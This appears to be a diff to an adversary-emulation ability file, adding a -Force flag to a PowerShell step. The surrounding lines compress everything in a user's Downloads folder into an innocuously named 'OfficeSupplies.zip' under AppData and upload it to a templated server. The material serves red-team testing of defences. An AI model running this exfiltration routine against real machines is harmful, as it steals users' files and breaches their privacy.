@@ -13,7 +13,7 @@
         command: |
 
           Write-Host "[*] Compressing all the things in download dir";
-          Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+          Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -Force -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
 
           Import-Module .\upload.ps1 -Verbose -Force;
           Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
